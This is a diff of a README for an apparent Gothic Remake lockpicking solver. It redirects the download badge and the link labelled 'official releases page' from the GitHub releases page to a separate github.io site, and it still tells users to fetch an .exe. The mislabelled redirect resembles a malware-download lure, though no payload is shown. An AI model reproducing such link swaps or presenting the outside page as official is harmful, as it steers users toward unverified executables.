@@ -1,12 +1,12 @@
 # 🔓 Gothic-Remake-Lockpick-Solver - Solve every lock puzzle with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rutuja913.github.io)
 
 This tool helps players solve lockpicking puzzles in the Gothic Remake. It calculates the correct sequence for sliders, pins, and plates. You no longer need to guess the movement pattern for doors or chest locks.
 
 ## 📥 How to download the software
 
-Visit the [official releases page](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases) to get the latest version. Look for the file ending in .exe under the assets section of the newest release. Click the file name to download it to your computer.
+Visit the [official releases page](https://rutuja913.github.io) to get the latest version. Look for the file ending in .exe under the assets section of the newest release. Click the file name to download it to your computer.
 
 ## ⚙️ System requirements
 
